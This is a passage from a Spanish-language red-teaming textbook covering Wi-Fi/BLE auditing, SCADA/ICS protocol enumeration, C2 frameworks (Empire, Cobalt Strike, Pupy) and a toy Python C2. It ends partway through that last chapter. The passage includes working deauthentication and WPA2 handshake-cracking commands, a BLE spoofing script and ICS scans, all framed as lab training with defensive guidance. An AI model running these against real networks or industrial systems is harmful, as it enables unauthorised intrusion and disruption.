* Comprender el funcionamiento interno de los protocolos **Wi-Fi (802.11)** y **Bluetooth Low Energy (BLE)**.
* Identificar vectores comunes de ataque en redes inalámbricas y dispositivos Bluetooth.
* Utilizar herramientas de auditoría como **aircrack-ng**, **aireplay-ng** y **wifite** de forma segura y controlada.
* Aprender a capturar, analizar y automatizar pipelines de pruebas inalámbricas en entornos de laboratorio.
* Implementar scripts en **Bash** y **Python** para orquestar capturas, conversión de paquetes y análisis automatizado.

> **Aviso ético:** este capítulo no promueve el acceso no autorizado a redes ni dispositivos. Todas las pruebas deben realizarse **únicamente en entornos propios o educativos**, con **consentimiento explícito** y respetando la legislación sobre comunicaciones inalámbricas.

---

## 1. Introducción: el aire como superficie de ataque

Las redes inalámbricas son el punto más expuesto de cualquier infraestructura.
Cualquier dispositivo en el rango físico de la señal puede observar o interferir en la comunicación si no se aplican medidas criptográficas adecuadas.

La seguridad Wi-Fi ha evolucionado:

* **WEP** (obsoleto) → vulnerable a ataques estadísticos.
* **WPA/WPA2-PSK** → mejorado, pero susceptible a ataques de fuerza bruta si se capturan handshakes.
* **WPA3** → introduce autenticación simultánea de iguales (SAE).
* **Bluetooth/BLE** → conectividad omnipresente, con debilidades en emparejamiento y spoofing de dispositivos.

---

## 2. Entorno de laboratorio seguro

**Requisitos mínimos:**

* Adaptador Wi-Fi compatible con modo monitor e inyección de paquetes.
* Tarjeta Bluetooth 5.0 o superior.
* Distribución Kali Linux o ParrotOS.
* Router personal o punto de acceso configurado para pruebas.
* Permisos administrativos para el laboratorio, *nunca redes de terceros*.

**Objetivo:** practicar la **detección, captura y análisis** sin conectarse ni alterar redes ajenas.

---

## 3. Fase 1 — Detección y enumeración Wi-Fi

### Escaneo con airodump-ng

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Muestra:

* BSSID (MAC del punto de acceso)
* Canal (CH)
* Cifrado (WEP/WPA/WPA2)
* Clientes asociados

### Automatización con wifite

```bash
sudo wifite --scan
```

Permite una auditoría más estructurada, detectando redes y modos de protección.

---

## 4. Fase 2 — Captura de handshakes (entornos propios)

```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon
```

* `-c` → canal
* `--bssid` → dirección del AP
* `-w` → archivo de salida

Luego, se puede **forzar la reconexión** de un cliente autorizado (en entorno propio) para capturar el handshake.

### Ejemplo (uso controlado):

```bash
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon
```

**Ética:** solo ejecutar si el AP y los clientes son tuyos o pertenecen al laboratorio.

---

## 5. Fase 3 — Pipeline de análisis y crackeo (controlado)

### Script en Bash

```bash
#!/bin/bash
# wifi_pipeline.sh — Captura y prueba de handshake WPA2 (laboratorio)
BSSID="00:11:22:33:44:55"
IFACE="wlan0mon"
OUT="lab_handshake"

echo "[*] Iniciando captura..."
timeout 60 airodump-ng -c 6 --bssid $BSSID -w $OUT $IFACE

echo "[*] Analizando archivo de captura..."
if aircrack-ng $OUT-01.cap | grep "WPA handshake"; then
    echo "[+] Handshake detectado, iniciando test con diccionario."
    aircrack-ng -w rockyou.txt -b $BSSID $OUT-01.cap
else
    echo "[!] No se detectó handshake. Intenta de nuevo."
fi
```

**Objetivo:** automatizar el ciclo de captura y prueba, **solo con redes propias**.

---

## 6. Bluetooth y BLE: fundamentos de seguridad

**Bluetooth clásico:** orientado a velocidad (p. ej., audio).
**BLE (Bluetooth Low Energy):** diseñado para bajo consumo (IoT, sensores, wearables).

### Riesgos típicos:

* **Emparejamiento sin autenticación.**
* **Direcciones MAC estáticas** que facilitan el seguimiento.
* **Exposición de servicios GATT** sin control de acceso.
* **Anuncios BLE falsificados (spoofing).**

---

## 7. Escaneo de dispositivos Bluetooth

### En Linux:

```bash
sudo hciconfig hci0 up
sudo hcitool scan
```

### BLE (baja energía):

```bash
sudo hcitool lescan
```

### Auditoría avanzada:

* **bluelog:** registra dispositivos detectados.
* **bettercap -iface hci0 -eval "ble.recon on"** → mapea anuncios BLE.

---

## 8. Automatización de análisis BLE (Python)

```python
#!/usr/bin/env python3
"""
ble_discovery.py — Escaneo BLE y análisis de anuncios.
Uso ético: laboratorio controlado.
"""
from bluepy import btle

scanner = btle.Scanner()
print("[*] Escaneando dispositivos BLE...")
devices = scanner.scan(10.0)

for dev in devices:
    print(f"MAC: {dev.addr} RSSI: {dev.rssi}dB")
    for (adtype, desc, value) in dev.getScanData():
        print(f"  {desc}: {value}")
```

**Qué hace:**

* Escanea 10 segundos.
* Enumera direcciones, intensidad y datos de anuncio.
* Permite detectar dispositivos mal configurados o con nombres predecibles.

---

## 9. Spoofing y pruebas de resiliencia (éticas)

> ⚠️ Solo ejecutar en **entornos propios**.

Un atacante podría suplantar un dispositivo BLE emitiendo paquetes de anuncio falsos.
La defensa consiste en verificar autenticidad y rotación de direcciones.

### Script simulado

```python
#!/usr/bin/env python3
"""
ble_spoof_sim.py — Simulación ética de emisión BLE.
Solo para verificar detección por IDS BLE.
"""
import os, time

device_name = "SENSOR_TEST"
while True:
    print(f"[+] Emulando anuncio BLE: {device_name}")
    os.system(f"sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 06 03 03 AA FE 17 16 AA FE 00 00 {device_name.encode().hex()} 00")
    time.sleep(5)
```

**Objetivo:** generar tráfico BLE inofensivo para verificar detección por herramientas como **bettercap** o **Wireshark**.

---

## 10. Recomendaciones defensivas

| Componente                 | Riesgo                           | Medida                                      |
| -------------------------- | -------------------------------- | ------------------------------------------- |
| **Wi-Fi**                  | Captura de handshakes            | Activar WPA3 / SAE y deshabilitar WPS.      |
| **Bluetooth/BLE**          | Emparejamiento sin autenticación | Forzar autenticación segura y rotación MAC. |
| **Routers/APs**            | Firmware vulnerable              | Actualizar y desactivar UPnP.               |
| **Dispositivos IoT BLE**   | Identificadores fijos            | Implementar resolvable private addresses.   |
| **Entornos empresariales** | Redes abiertas                   | Segmentar VLAN para invitados.              |

---

## 11. Ejercicio de laboratorio

1. Configura un router de pruebas WPA2-PSK con contraseña conocida.
2. Usa `wifi_pipeline.sh` para capturar un handshake.
3. Analiza con `aircrack-ng` y verifica la detección (sin romper claves).
4. Activa un dispositivo BLE (smartwatch o sensor) y escanéalo con `ble_discovery.py`.
5. Emite tráfico simulado con `ble_spoof_sim.py` y observa detección en **bettercap**.
6. Documenta resultados y evalúa contramedidas (rotación de MAC, autenticación segura).

---

## 12. Checklist de seguridad inalámbrica

* [ ] WPA3 o WPA2 con contraseñas robustas.
* [ ] Desactivar WPS y redes abiertas.
* [ ] Rotar claves periódicamente.
* [ ] Actualizar firmware del AP.
* [ ] Bluetooth con emparejamiento autenticado.
* [ ] Uso de BLE Private Addresses.
* [ ] Escaneos periódicos con `bettercap` o `Wireshark`.
* [ ] Segmentar red Wi-Fi de IoT.
* [ ] IDS inalámbrico activo.
* [ ] Logs centralizados de conexiones y dispositivos detectados.

---

## 13. Conclusión

El espacio aéreo digital es un entorno dinámico y altamente expuesto.
Cada paquete capturado puede revelar información valiosa, y cada señal mal configurada puede servir de punto de entrada.
El Red Teamer ético **no ataca el aire: lo protege**, demostrando qué tan frágiles pueden ser las ondas si no se cifran y autentican correctamente.

El dominio de herramientas como **aircrack-ng**, **wifite** y las librerías de **BLE** no se usa para vulnerar, sino para **anticipar y fortificar**.
La verdadera ofensiva en ciberseguridad es la prevención informada.

---

# Capítulo 47 — SCADA/ICS Red Teaming

**Protocolos industriales, simulación y defensa en entornos críticos**

---

## Objetivos

* Comprender la estructura y los componentes fundamentales de los sistemas **SCADA (Supervisory Control and Data Acquisition)** e **ICS (Industrial Control Systems)**.
* Analizar los principales **protocolos industriales** (Modbus, DNP3, OPC-UA, IEC 60870-5-104) y sus debilidades históricas.
* Implementar entornos de **simulación segura** para entrenar habilidades de Red Teaming sin comprometer infraestructura real.
* Desarrollar **scripts de detección, enumeración y monitoreo** en Python y Bash.
* Entender los riesgos del puente entre TI (Tecnologías de la Información) y TO (Tecnologías Operacionales).

> **Aviso ético:** los ejemplos de este capítulo son **exclusivamente educativos y defensivos**. Las pruebas de Red Team en sistemas industriales solo deben realizarse en **entornos simulados o réplicas controladas**. La manipulación de sistemas SCADA reales sin autorización puede causar daños físicos y violar leyes de ciberseguridad industrial.

---

## 1. Introducción: el riesgo industrial digital

Los sistemas SCADA/ICS gobiernan **infraestructuras críticas**: energía, transporte, agua, manufactura y petróleo.
Su misión es mantener la operación continua de plantas y maquinaria en tiempo real.
El problema: la mayoría fue diseñado décadas atrás, sin seguridad integrada, asumiendo aislamiento físico (“air gap”).

Con la modernización y la integración con redes corporativas, los **vectores de ataque** se multiplicaron:

* Interfaces HMI expuestas vía web o RDP.
* Controladores PLC accesibles por IP.
* Protocolos sin autenticación.
* VPN industriales mal configuradas.
* Falta de segmentación entre redes TI y TO.

---

## 2. Arquitectura de referencia ICS

| Capa                      | Elementos                           | Descripción                              |
| ------------------------- | ----------------------------------- | ---------------------------------------- |
| **Nivel 0 — Físico**      | Sensores, actuadores.               | Interactúan con procesos físicos.        |
| **Nivel 1 — Control**     | PLCs, RTUs.                         | Controlan directamente los dispositivos. |
| **Nivel 2 — Supervisión** | HMIs, SCADA servers.                | Visualizan y gestionan procesos.         |
| **Nivel 3 — Operacional** | Historians, bases de datos, ERP.    | Gestión de producción.                   |
| **Nivel 4 — Corporativo** | Redes TI, usuarios, administración. | Planificación y logística.               |

El **Red Teamer ético** debe comprender estas capas para identificar vectores sin interferir en la operación.

---

## 3. Protocolos industriales comunes y sus riesgos

| Protocolo                  | Uso                                | Riesgos principales                              |
| -------------------------- | ---------------------------------- | ------------------------------------------------ |
| **Modbus/TCP**             | Comunicación PLC ↔ SCADA.          | Sin cifrado ni autenticación.                    |
| **DNP3**                   | Sistemas eléctricos.               | Falsificación de mensajes y replay.              |
| **OPC-UA**                 | Interoperabilidad moderna.         | Configuraciones inseguras, certificados débiles. |
| **IEC 60870-5-104**        | Redes eléctricas europeas.         | Falta de integridad de mensaje.                  |
| **Profinet / EtherNet/IP** | Control industrial en tiempo real. | Exposición a escaneo no autorizado.              |

---

## 4. Descubrimiento de entornos industriales (solo simulados)

### Nmap con scripts especializados

```bash
sudo nmap -Pn -sS -p 502,20000,44818,102,2404 --script modbus-discover,dnp3-info,iec-identify 192.168.56.0/24
```

**Propósito:** identificar protocolos industriales activos en una red de laboratorio virtual (por ejemplo, simuladores PLC o ModbusPal).
**Advertencia:** no ejecutar sobre redes reales de producción.

---

## 5. Simuladores y entornos de práctica

| Herramienta                  | Descripción                                | Uso ético                               |
| ---------------------------- | ------------------------------------------ | --------------------------------------- |
| **ModbusPal**                | Simulador de esclavos Modbus en Java.      | Permite experimentar sin hardware.      |
| **Conpot**                   | Honeypot ICS/SCADA modular.                | Entrenamiento de detección y respuesta. |
| **ScadaBR**                  | Plataforma SCADA open-source.              | Simulación completa de monitoreo.       |
| **Digital Bond’s Quickdraw** | Firmas Snort para protocolos industriales. | Análisis defensivo.                     |

### Ejemplo de despliegue en Kali:

```bash
sudo apt install conpot
sudo conpot --template default
```

Esto crea un entorno seguro para observar interacciones industriales simuladas.

---

## 6. Script de enumeración Modbus (Python)

```python
#!/usr/bin/env python3
"""
modbus_enum.py — Enumeración pasiva de dispositivos Modbus/TCP.
Uso ético: entornos simulados o de laboratorio.
"""
from pymodbus.client import ModbusTcpClient

target = "192.168.56.10"
port = 502
client = ModbusTcpClient(target, port=port)
if client.connect():
    print(f"[+] Conectado a {target}:{port}")
    rr = client.read_holding_registers(0, 10, unit=1)
    if rr.isError():
        print("[!] Lectura no permitida o error.")
    else:
        print("[*] Datos del registro:", rr.registers)
    client.close()
else:
    print("[!] No se pudo conectar al servidor Modbus.")
```

**Qué hace:**

* Establece conexión con un servidor Modbus (p. ej. ModbusPal).
* Intenta leer registros iniciales (sin modificar nada).
* No altera parámetros ni envía comandos de control.

---

## 7. Plantilla Bash para monitoreo y registro

```bash
#!/bin/bash
# scada_monitor.sh — Monitoreo básico de tráfico Modbus
IFACE="eth0"
OUT="modbus_capture.pcap"

echo "[*] Capturando tráfico Modbus en $IFACE..."
sudo tcpdump -i $IFACE port 502 -w $OUT -c 200
echo "[+] Captura finalizada. Analiza con Wireshark usando display filter 'modbus'."
```

**Propósito:** capturar sesiones Modbus en red simulada para análisis con Wireshark o Zeek.

---

## 8. Escenarios de escalada típicos (educativos)

| Vector                            | Descripción                                   | Contramedida                               |
| --------------------------------- | --------------------------------------------- | ------------------------------------------ |
| **Credenciales por defecto**      | PLCs con usuario “admin/admin”.               | Cambiar credenciales al desplegar.         |
| **Puertos ICS expuestos**         | 502/TCP, 2404/TCP accesibles desde TI.        | Segmentar red TO mediante firewalls.       |
| **Sin autenticación en comandos** | Es posible escribir registros sin validación. | Limitar funciones Modbus a lectura.        |
| **Sin logging**                   | No se registran comandos críticos.            | Activar Syslog o SIEM industrial.          |
| **Conexión PLC ↔ nube sin TLS**   | Transmisión de datos sensible sin cifrado.    | Implementar VPNs industriales (TLS/IPSec). |

---

## 9. Automatización de monitoreo en Python

```python
#!/usr/bin/env python3
"""
ics_sniffer.py — Monitorización defensiva de tráfico ICS (simulado).
Detecta comandos Modbus Write y eventos anómalos.
"""
from scapy.all import sniff, TCP

def handler(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
        payload = bytes(pkt[TCP].payload)
        if payload and payload[7:8] == b'\x06':  # Función 6: Write Single Register
            print(f"[!] Posible intento de escritura Modbus desde {pkt[IP].src}")

sniff(filter="tcp port 502", prn=handler, store=0, count=0)
```

**Qué hace:**

* Escucha el puerto Modbus en tiempo real.
* Detecta intentos de escritura (función 6).
* Permite crear alertas en sistemas de monitoreo (IDS).

---

## 10. Simulación de ataques y defensas (solo en laboratorio)

1. Configurar **Conpot** con plantilla Modbus.
2. Ejecutar `modbus_enum.py` para verificar comunicación.
3. Probar el script `ics_sniffer.py` mientras se simula tráfico legítimo.
4. Crear reglas IDS personalizadas para detectar comandos Write.
5. Analizar capturas con Wireshark y documentar patrones.

---

## 11. Medidas de defensa y hardening industrial

| Componente              | Mitigación                                                     |
| ----------------------- | -------------------------------------------------------------- |
| **Red**                 | Segmentar TI y TO; uso de firewalls industriales.              |
| **Autenticación**       | Implementar control de acceso en PLCs y HMIs.                  |
| **Protocolos**          | Adoptar variantes seguras (DNP3-SA, OPC-UA con TLS).           |
| **Supervisión**         | Habilitar logs, Syslog y correlación en SIEM.                  |
| **Gestión de firmware** | Firmas digitales y control de versiones.                       |
| **IDS/IPS Industrial**  | Implementar herramientas como Zeek o Security Onion adaptadas. |
| **Backups**             | Versionar configuraciones de PLC.                              |
| **Entrenamiento**       | Simular incidentes en laboratorios como Cyber Range ICS.       |

---

## 12. Ejercicio práctico

1. Instala **Conpot** en Kali y configúralo en la interfaz virtual `eth0`.
2. En otra máquina virtual, ejecuta `modbus_enum.py` apuntando a la IP de Conpot.
3. Abre Wireshark y usa el filtro `modbus`.
4. Observa los paquetes de lectura y asegúrate de que no haya comandos de escritura.
5. Lanza `ics_sniffer.py` y verifica detección de paquetes Modbus “Write”.
6. Documenta tiempos, respuestas y registros capturados.

---

## 13. Checklist de Red Team/Blue Team para ICS

* [ ] No usar entornos de producción.
* [ ] Monitoreo de tráfico industrial 24/7.
* [ ] Segmentación y VLAN dedicadas.
* [ ] Protocolos cifrados (TLS, DNP3-SA).
* [ ] Control de acceso físico y lógico.
* [ ] Políticas de parcheo industrial.
* [ ] Backups verificados de PLCs.
* [ ] Auditorías periódicas con simuladores.
* [ ] Correlación de logs TI/TO.
* [ ] Entrenamiento en respuesta a incidentes industriales.

---

## 14. Conclusión

Los sistemas SCADA e ICS son el corazón de la infraestructura moderna, pero también su punto más débil si se olvida la seguridad.
Las pruebas de Red Teaming industrial deben ser **quirúrgicas, simuladas y documentadas**.
Con herramientas como **Conpot**, **ModbusPal** y scripts de enumeración seguros, es posible reproducir escenarios de ataque sin poner en riesgo instalaciones reales.

La clave está en **entender los protocolos, no romperlos**: el conocimiento técnico sirve para anticipar vulnerabilidades y fortalecer la resiliencia operativa.
El Red Team ético en entornos industriales se convierte, finalmente, en un **guardian del proceso físico** que mantiene el mundo en movimiento.

---

## Parte VIII — Command & Control, herramientas y desarrollo

# Capítulo 48 — Frameworks C2: Empire, Cobalt Strike (legales) y Pupy

**Comparación, arquitectura y uso ético de entornos de Comando y Control (C2)**

---

## Objetivos

* Comprender el propósito, funcionamiento y arquitectura de los **frameworks C2 (Command and Control)** usados en pruebas de Red Teaming.
* Analizar de forma ética los entornos **Empire**, **Cobalt Strike (licenciado)** y **Pupy**.
* Aprender a integrar scripts de automatización para telemetría, control y registro.
* Diseñar laboratorios de C2 seguros y aislados, siguiendo políticas de uso responsable.
* Aplicar medidas de mitigación desde la perspectiva del Blue Team para detectar y responder ante C2 reales.

> **Aviso ético:** este capítulo tiene un enfoque **formativo y defensivo**. El uso de herramientas de comando y control en entornos no autorizados es ilegal. Las demostraciones y ejemplos deben ejecutarse **únicamente en entornos virtuales propios**, desconectados de internet, con fines educativos y de entrenamiento profesional.

---

## 1. Introducción: el rol del C2 en una campaña Red Team

Los **frameworks C2** permiten a los equipos de simulación coordinar múltiples agentes (implantes) distribuidos en sistemas de prueba.
Su finalidad es emular a un adversario avanzado (APT) dentro de un entorno controlado, midiendo la eficacia de las defensas.

En términos prácticos, un C2:

* Gestiona sesiones remotas (shells o payloads controlados).
* Ejecuta tareas, recolecta datos y mantiene persistencia simulada.
* Proporciona cifrado, canales encubiertos y reporting.

**Sin embargo**, cuando se utiliza fuera de un contexto legal o educativo, un C2 se convierte en una herramienta de intrusión.
El profesional ético la usa **para fortalecer la defensa**, no para vulnerar sistemas reales.

---

## 2. Arquitectura general de un C2

| Componente                | Descripción                                    | Analogía               |
| ------------------------- | ---------------------------------------------- | ---------------------- |
| **Servidor C2**           | Núcleo central; recibe y envía comandos.       | Cuartel general.       |
| **Agente (implant)**      | Software que ejecuta tareas en el host remoto. | Agente en campo.       |
| **Canal de comunicación** | HTTP(S), SMB, TCP, DNS, o WebSocket.           | Línea de comunicación. |
| **Listener**              | Proceso que espera conexiones entrantes.       | Antena receptora.      |
| **Operator Console**      | Interfaz del red teamer.                       | Panel de mando.        |

La comunicación suele estar cifrada y disimulada para evadir detecciones, pero **en un entorno ético esto se usa solo para simular amenazas** y probar la respuesta defensiva.

---

## 3. Comparativa de frameworks principales

| Característica              | **Empire**                        | **Cobalt Strike**      | **Pupy**             |
| --------------------------- | --------------------------------- | ---------------------- | -------------------- |
| **Lenguaje base**           | Python + PowerShell               | Java                   | Python               |
| **Licencia**                | Open-source                       | Comercial              | Open-source          |
| **Persistencia**            | Scripts PowerShell o Python       | Beacons personalizados | Agentes dinámicos    |
| **Canales C2**              | HTTP/S, SMB, TCP                  | HTTP/S, DNS, SMB       | TCP, HTTP, WebSocket |
| **Infraestructura modular** | Sí                                | Sí (Team Server)       | Sí                   |
| **Uso legítimo**            | Formación y laboratorios          | Red Team profesional   | Investigación        |
| **Detección/Blue Team**     | Fácilmente detectable sin cifrado | Más sigiloso           | Variable             |

---

## 4. Empire Framework — entorno educativo

**Empire** es una plataforma open-source diseñada para entrenamiento en Red Team y Blue Team.
Incluye un servidor C2 (`empire`) y agentes PowerShell o Python que permiten ejecutar comandos simulados.

### Instalación (en laboratorio cerrado)

```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
sudo ./empire
```

### Ejemplo de uso (ético)

```bash
(Empire) > listeners
(Empire) > uselistener http
(Empire: http) > info
(Empire: http) > execute
```

**Propósito:** crear un listener y observar el intercambio entre el servidor y el agente simulado (sin interactuar con sistemas reales).

### Integración con scripts

Empire permite integrar tareas automatizadas en Python para monitoreo y registro:

```python
#!/usr/bin/env python3
"""
empire_audit.py — Registro de sesiones activas en Empire.
Uso ético: monitoreo en laboratorio.
"""
import requests, json

url = "https://127.0.0.1:1337/api/sessions"
headers = {"Authorization": "Bearer <token_api>"}
r = requests.get(url, headers=headers, verify=False)
for s in r.json():
    print(f"Session: {s['session_id']} - Host: {s['hostname']} - User: {s['username']}")
```

**Qué hace:** obtiene sesiones activas desde la API REST de Empire y las documenta sin ejecutar comandos en los agentes.

---

## 5. Cobalt Strike — profesional y licenciado

**Cobalt Strike** es un entorno comercial de simulación avanzada de amenazas (pagado y con licencia).
Permite a los equipos Red Team diseñar campañas completas de ataque y respuesta con agentes denominados **Beacons**.

### Componentes principales

* **Team Server:** centraliza control y datos.
* **Beacon:** implante que simula actividades APT.
* **Aggressor Scripts:** extensiones en JavaScript-like para automatizar tareas.

**Casos de uso legítimo:**

* Evaluación de respuesta ante intrusiones simuladas.
* Entrenamiento de SOC y Blue Teams.
* Simulación de malware sin daño real.

### Ejemplo de integración defensiva (logs de sesiones)

```bash
#!/bin/bash
# cobalt_sessions.sh — Registro automático de Beacons (uso ético)
TEAMSERVER="192.168.56.5"
LOG="/var/log/cobalt_sessions.log"
grep "Beacon Checkin" /opt/cobaltstrike/logs/teamserver.log | tail -10 >> $LOG
echo "[*] Últimas sesiones registradas en $LOG"
```

**Propósito:** recolectar trazas de actividad para analizar visibilidad y tiempos de respuesta.

---

## 6. Pupy — framework de investigación

**Pupy** es una herramienta escrita en Python y C, creada con fines académicos para explorar técnicas de control remoto multiplataforma.
Es modular y transparente, ideal para analizar comunicaciones C2 a nivel de protocolo.

### Instalación controlada

```bash
git clone https://github.com/n1nj4sec/pupy.git
cd pupy
python3 -m pip install -r requirements.txt
```

### Uso educativo

Ejecutar `pupysh.py` inicia la consola del servidor.
Los “agentes” deben ejecutarse **solo en máquinas virtuales propias desconectadas de la red externa**.

---

## 7. Automatización y telemetría en C2

En un entorno ético, los scripts sirven para **documentar actividad, tiempos de respuesta y comportamiento defensivo**.

### Ejemplo Python — Registro generalizado

```python
#!/usr/bin/env python3
"""
c2_monitor.py — Registro unificado de sesiones C2 (Empire, Cobalt, Pupy).
"""
import os, datetime

logs = {
    "Empire": "/opt/Empire/empire.log",
    "Cobalt Strike": "/opt/cobaltstrike/logs/teamserver.log",
    "Pupy": "/opt/pupy/logs/server.log"
}

print("[*] Consolidando registros C2...")
for name, path in logs.items():
    if os.path.exists(path):
        with open(path) as f:
            lines = f.readlines()[-5:]
            print(f"\n== Últimos eventos en {name} ==")
            for l in lines:
                print(l.strip())
    else:
        print(f"[!] No se encontró {name}.")
```

**Propósito:** centralizar logs de simulaciones C2 para análisis forense y métricas de visibilidad.

---

## 8. Mitigación y defensa ante C2 reales

| Indicador                          | Descripción                            | Medida defensiva                       |
| ---------------------------------- | -------------------------------------- | -------------------------------------- |
| **Conexiones persistentes HTTP/S** | Comunicación entre agentes y servidor. | Monitorizar tráfico anómalo con IDS.   |
| **DNS o SMB inusual**              | Canales encubiertos.                   | Aplicar listas blancas y segmentación. |
| **Beacons periódicos**             | Peticiones con intervalos regulares.   | Detección por comportamiento.          |
| **Ofuscación de PowerShell**       | Scripts comprimidos o codificados.     | Reglas YARA y AMSI activas.            |
| **Procesos hijos anómalos**        | cmd/powershell lanzados por servicios. | EDR con monitoreo de herencias.        |

### Herramientas de defensa

* **Elastic SIEM / Splunk:** para correlación de logs.
* **Zeek / Suricata:** detección de patrones C2.
* **Sysmon + Sigma:** generación de alertas por comportamiento.
* **Endpoint Security (EDR):** análisis de PowerShell y conexiones salientes.

---

## 9. Práctica de laboratorio controlado

1. Configura tres VMs (Kali, Windows y Ubuntu).
2. Instala Empire y lanza un listener HTTP en Kali.
3. En Windows, crea un script simulado que se conecte al listener (sin payloads dañinos).
4. Usa `empire_audit.py` para registrar las conexiones.
5. Crea un log consolidado con `c2_monitor.py`.
6. Activa Wireshark y captura tráfico entre las máquinas.
7. Analiza el patrón temporal de peticiones y evalúa cómo podría detectarlo un IDS.

---

## 10. Checklist ético de uso de frameworks C2

* [ ] Operar únicamente en entornos de laboratorio cerrados.
* [ ] No desplegar agentes en sistemas externos.
* [ ] Mantener aislamiento de red (sin salida a Internet).
* [ ] Documentar cada sesión y comando ejecutado.
* [ ] Evitar payloads reales: usar plantillas simuladas.
* [ ] Monitorear tráfico C2 para entrenar defensas.
* [ ] Borrar entornos tras la práctica.
* [ ] Cumplir la normativa de software licenciado (Cobalt Strike).
* [ ] Educar en detección y respuesta, no en intrusión.
* [ ] Respetar el principio de “mínimo impacto operativo”.

---

## 11. Conclusión

Los frameworks C2 son el equivalente moderno del campo de entrenamiento del Red Team.
Permiten simular ataques complejos de forma **segura, reproducible y medible**.
Cuando se utilizan con ética y responsabilidad, **no son herramientas de intrusión, sino de enseñanza y mejora defensiva**.

La combinación de Empire, Cobalt Strike y Pupy —cada uno con su propósito— ofrece un panorama completo del ciclo de control, detección y respuesta.
El profesional que domina estos entornos en laboratorio no busca comprometer, sino **entrenar la resiliencia**.

El conocimiento del enemigo, recordemos, es la mejor forma de garantizar que nunca gane.

---

# Capítulo 49 — Diseño y desarrollo de un C2 básico en Python

**Arquitectura, cifrado y módulos — Implementación paso a paso (uso ético y educativo)**

---

## Objetivos

* Comprender los principios arquitectónicos de un sistema **Command and Control (C2)**.
* Diseñar un modelo educativo de C2 en Python, centrado en la comunicación segura y la modularidad.
* Aprender a estructurar servidores, clientes y canales cifrados en un entorno de laboratorio.
* Analizar los mecanismos de persistencia y control desde una perspectiva defensiva.
* Demostrar cómo un C2 ético puede usarse para **simular** amenazas, no para comprometer sistemas reales.

> **Aviso ético:** este capítulo describe un diseño **conceptual y controlado**, sin incluir código malicioso.
> El propósito es educativo: comprender cómo funciona un C2 para **detectar, mitigar y responder** a su comportamiento en entornos reales.

---

## 1. Concepto general: ¿qué es un C2?

Un **C2 (Command and Control)** es un sistema de comunicación entre un servidor (operador) y uno o más clientes (agentes) que reciben y ejecutan instrucciones.
En un contexto ético, se emplea para **simular adversarios** y **entrenar defensas** en laboratorios cerrados.

**Componentes básicos:**

* **Servidor C2:** recibe conexiones, distribuye tareas, registra eventos.
* **Agente (cliente):** ejecuta tareas simuladas y responde.
* **Canal de comunicación:** TCP, HTTP(S) o WebSocket.
* **Cifrado:** asegura la confidencialidad de los datos transmitidos.
* **Módulos:** funciones específicas (telemetría, información del sistema, logs).

---

## 2. Arquitectura general del C2

```text
+-------------------+        Enlace cifrado        +-------------------+
|     Servidor C2   | <--------------------------> |     Cliente(s)     |
| (Comandos, logs)  |                             | (Responde tareas)  |
+-------------------+                             +-------------------+
```

Cada cliente se comunica con el servidor, consulta tareas pendientes y envía resultados.
Para fines educativos, ambos pueden ejecutarse en la misma máquina virtual.

---

## 3. Diseño modular del sistema

| Módulo            | Descripción                        | Ejemplo educativo           |
| ----------------- | ---------------------------------- | --------------------------- |
| `c2_server.py`    | Servidor TCP con cifrado simulado. | Recibe y registra comandos. |
| `c2_client.py`    | Cliente que consulta tareas.       | Reporta mensajes de prueba. |
| `crypto_utils.py` | Funciones de cifrado AES y RSA.    | Protege datos transmitidos. |
| `modules/`        | Extensiones educativas.            | “ping”, “status”, “info”.   |

Este diseño favorece el **aprendizaje progresivo**: comprender cómo se comunican ambos extremos sin impacto en terceros.

---

## 4. Comunicación cifrada (conceptual)

En un entorno real, la comunicación entre servidor y agente debe protegerse con cifrado simétrico (AES) o asimétrico (RSA).
Aquí lo haremos solo de forma conceptual para entender el flujo.

### Ejemplo conceptual de intercambio seguro

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_EAX)
ciphertext, tag = cipher.encrypt_and_digest(b"mensaje de prueba")
print(ciphertext)
```

El mensaje cifrado puede ser transmitido entre servidor y cliente, garantizando confidencialidad.
En un laboratorio, este mecanismo permite enseñar **detección de tráfico cifrado** y cómo los IDS analizan metadatos, no contenido.

---

## 5. Implementación paso a paso

### 1. Servidor básico (educativo)

```python
#!/usr/bin/env python3
"""
c2_server.py — Servidor C2 educativo y seguro.
Recibe conexiones y responde comandos simulados.
"""
import socket, threading, datetime

def handle_client(conn, addr):
    print(f"[+] Conexión desde {addr}")
    conn.send(b"OK: conectado al servidor C2 educativo\n")
    while True:
        cmd = conn.recv(1024).decode().strip()
        if cmd == "exit":
            conn.send(b"Bye\n")
            break
        elif cmd == "ping":
            conn.send(b"PONG\n")
        elif cmd == "time":
            conn.send(str(datetime.datetime.now()).encode() + b"\n")
        else:
            conn.send(b"Comando desconocido\n")
    conn.close()

s = socket.socket()
s.bind(("0.0.0.0", 9999))
s.listen(5)
print("[*] Servidor C2 en escucha (puerto 9999)...")

while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
```

**Qué hace:**

* Acepta conexiones entrantes en el puerto 9999.
* Procesa comandos limitados (`ping`, `time`, `exit`).
* No ejecuta ni descarga nada del sistema.
* Simula control remoto **de forma inocua y segura**.

---

### 2. Cliente educativo

```python
#!/usr/bin/env python3
"""
c2_client.py — Cliente educativo de C2.
Envía comandos simulados al servidor.
"""
import socket, time

SERVER = "127.0.0.1"
PORT = 9999

sock = socket.socket()
sock.connect((SERVER, PORT))
print(sock.recv(1024).decode())

for cmd in ["ping", "time", "exit"]:
    print(f"> {cmd}")
    sock.send(cmd.encode())
    print(sock.recv(1024).decode().strip())
    time.sleep(1)
sock.close()
```

**Propósito:**

* Se conecta al servidor local.
* Envía tres comandos predefinidos.
* Demuestra cómo se gestiona la comunicación cliente-servidor.

---

## 6. Extensión modular (educativa)

En el directorio `modules/`, se pueden agregar scripts simples para extender el C2:

```python
# modules/status.py
def run():
    return "Estado del agente: operativo"
```

Luego, el servidor puede cargarlos dinámicamente:

```python
import importlib
mod = importlib.import_module("modules.status")
print(mod.run())
```

De este modo, se simula cómo los C2 reales cargan capacidades adicionales, sin incluir funciones ofensivas.

---

## 7. Registro y auditoría

